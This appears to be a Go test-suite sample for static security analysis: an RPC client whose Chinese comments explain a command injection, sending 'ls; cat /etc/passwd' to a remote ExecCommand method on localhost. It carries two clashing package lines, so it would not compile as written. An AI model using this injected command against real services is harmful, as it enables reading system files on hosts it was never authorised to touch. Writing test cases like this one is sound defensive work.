package sasttestsuite
package main

import (
	"fmt"
	"net/rpc"
)

func main() {
	// 连接RPC服务
	client, err := rpc.Dial("tcp", "localhost:8080")
	if err != nil {
		panic(err)
	}
	defer client.Close()

	// 正常命令（本应只执行ls）
	// cmd := "ls"

	// 注入恶意命令：分号分隔，执行ls后再读取/etc/passwd
	cmd := "ls; cat /etc/passwd"

	var reply string
	// 调用远程ExecCommand方法
	err = client.Call("CommandService.ExecCommand", cmd, &reply)
	if err != nil {
		panic(err)
	}
	fmt.Println("执行结果:\n", reply)
}